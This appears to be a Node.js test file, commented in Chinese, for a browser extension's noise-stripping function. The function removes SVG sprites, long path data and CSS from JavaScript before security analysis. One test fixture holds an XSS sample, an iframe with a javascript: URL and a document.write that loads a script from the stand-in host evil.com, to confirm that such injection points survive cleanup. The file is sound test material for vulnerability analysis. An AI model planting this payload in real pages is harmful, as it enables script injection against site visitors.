// test/noise_v4_test.js - 验证 JS 中的 HTML 噪声清理：<style> 统一剔除 + <symbol>/<path> 雪碧图片段
'use strict';
const fs = require('fs');
const path = require('path');
let src = fs.readFileSync(path.join(__dirname, '..', 'extension', 'analyze.js'), 'utf8').replace(/^'use strict';/, '');
global.document = { getElementById: () => ({ classList: { add() {}, remove() {}, toggle() {} }, addEventListener() {}, appendChild() {}, style: {} }), createElement: () => ({ classList: { add() {}, remove() {}, toggle() {} }, appendChild() {} }), addEventListener() {} };
global.chrome = { storage: { local: { get: async () => ({ settings: {} }), set: async () => {} } }, tabs: { get: async () => ({}) }, runtime: { getURL: () => '', sendMessage: async () => null }, scripting: {} };
global.location = { search: '' };
eval(src + ';global.__Ns={stripNoise};');
const N = global.__Ns.stripNoise;

// 场景1：用户报告的案例 —— JS 模板字符串里的雪碧图片段（<symbol> 开头，不套 <svg> 外壳）
const jsSprite = 't.innerHTML=`<symbol id="icon-404" viewBox="0 0 128 128"><path d="M121.718 73.272v9.953c3.957-7.584 ' + 'M1 2 L3 4 '.repeat(200) + '" fill="red"/></symbol>`; var apiKey="abc";';
const r1 = N(jsSprite);
// 场景2：JS 里拼接的 <style> 块（document.write 场景）也要剔除
const jsStyle = "document.write('<style>body{margin:0;padding:100px 0 0;background:#f2f2f2" + 'a{color:#333}'.repeat(100) + "</style>');";
const r2 = N(jsStyle);
// 场景3：散落的 <path d="M..."> 长路径（无 symbol 包裹）剔除
const lonePath = 'el.innerHTML = "<path d=\\"' + 'M1 2 L3 4 '.repeat(100) + '\\" fill=\"#000\"/>"; fetch("/api/user");';
const r3 = N(lonePath);
// 场景4：短 d 属性的 path 保留（避免误伤业务逻辑里的短字符串）
const shortPath = 'x = "<path d=\\"M1 2\\"/>"; keep();';
const r4 = N(shortPath);
// 场景5：XSS 相关的 HTML 注入点保留（innerHTML 里的 iframe/script 是漏洞分析价值点，不能清）
const xssSink = 't.innerHTML = "<iframe src=javascript:alert(1)></iframe>"; document.write("<script src=\\"//evil.com/x.js\\"></scr"+"ipt>");';
const r5 = N(xssSink);
// 场景6：安全比较场景不受影响（< symbol 之类的代码不能被误杀到文件尾）
const codeSafe = 'if (len < symbols.length) { process(); } var cfg = "/api/config";';
const r6 = N(codeSafe);

const checks = {
  'symbol雪碧图片段剔除': r1.text.includes('[SVG雪碧图已剔除:') && !r1.text.includes('icon-404') && !r1.text.includes('M121.718'),
  'symbol场景JS代码保留': r1.text.includes('var apiKey="abc"'),
  'JS中style块剔除': r2.text.includes('[CSS样式已剔除:') && !r2.text.includes('margin:0'),
  '散落长path剔除': r3.text.includes('[SVG路径已剔除:') && !r3.text.includes('fill="#000"'),
  '短path保留': r4.text.includes('keep();') && !r4.text.includes('SVG路径已剔除'),
  'XSS注入点保留': r5.text.includes('<iframe src=javascript:alert(1)') && r5.text.includes('evil.com'),
  '普通代码不受影响': r6.text.includes('symbols.length') && r6.text.includes('process();') && r6.text.includes('/api/config')
};
let pass = 0;
for (const [k, v] of Object.entries(checks)) { console.log((v ? '✅' : '❌') + ' ' + k); if (v) pass++; }
console.log('噪声清理v4测试:', pass + '/' + Object.keys(checks).length);
process.exit(pass === Object.keys(checks).length ? 0 : 1);
